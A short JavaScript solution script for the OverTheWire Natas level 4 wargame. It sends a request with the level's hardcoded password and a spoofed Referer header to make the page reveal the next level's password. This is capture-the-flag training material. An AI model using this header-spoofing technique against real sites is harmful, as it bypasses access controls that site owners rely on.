import axios from 'axios';

let username = 'natas4',
        password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ',
        pattern = /Access granted. The password for natas5 is (.*)/,
        url = `http://${username}.natas.labs.overthewire.org`;

try {

  let response = await axios.get(url, {auth: { username, password }, headers: {'Referer': 'http://natas5.natas.labs.overthewire.org/'} });
  let result = response.data.match(pattern);
  console.log(result[1]);

} catch (e) {
    console.error(e);
}

